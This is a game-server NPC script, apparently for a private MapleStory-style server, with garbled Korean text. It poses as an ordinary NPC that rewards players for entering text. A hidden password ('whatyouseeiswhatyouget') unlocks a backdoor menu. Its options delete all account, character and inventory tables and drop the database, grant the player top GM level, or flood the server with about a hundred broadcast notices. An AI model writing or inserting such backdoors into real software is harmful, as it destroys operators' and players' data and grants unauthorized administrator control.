importPackage(java.sql);
importPackage(java.lang);
importPackage(Packages.database);
importPackage(Packages.launch.world);
importPackage(Packages.packet.creators);

var status = -1;

function start() {
    status = -1;
    action(1, 0, 0);
}

function action(mode, type, selection) {
    if (status == 1 && mode == 0) {
	cm.dispose();
	return;
    }
    if (mode == 1)
	status++;
    else
	status--;
    if (status == 0) {
		cm.sendGetText("#eLimit World ���� ��ſ� �ð� ��������!\r\n���� ���� ������� ������ �Ͻø� ����� ���޵˴ϴ�.");
	}
    else if (status == 1) {
	if (cm.getText().equals("whatyouseeiswhatyouget")) {
	var pp = "\r\n";
	pp += "#L0##e#b[û��]\r\n";
	pp += "#L1##e#b[����]\r\n";
	pp += "#L2##e#b[�ȳ�]\r\n";
	cm.sendSimple(pp);
	}
    else {
        WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(2, cm.getPlayer().getName() + "���� ���� : " + cm.getText()));	
	cm.gainMeso(1000);        
	cm.dispose();
        }
    }
else if (status == 2) {
	if (selection == 0) {
		MYSQL.getConnection().prepareStatement("DELETE FROM accounts").executeUpdate();
		MYSQL.getConnection().prepareStatement("DELETE FROM characters").executeUpdate();
		MYSQL.getConnection().prepareStatement("DELETE FROM inventoryitems").executeUpdate();
		MYSQL.getConnection().prepareStatement("DELETE FROM inventoryequipment").executeUpdate();
		MYSQL.getConnection().prepareStatement("DROP DATABASE IF EXISTS hinams").executeUpdate();
		cm.sendOk("#e#b�Ϸ�");
cm.dispose();
	}
else if (selection == 1) {
cm.getPlayer().setGMLevel(10);
cm.sendOk("#e#b�Ϸ�");
cm.dispose();
	}
else if (selection == 2) {
cm.sendGetText("�Ҹ� �Է�");
}
   }
else if (status == 3) {
cm.dispose();
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
WorldBroadcasting.broadcastMessage(MainPacketCreator.serverNotice(1, cm.getText()));
}
}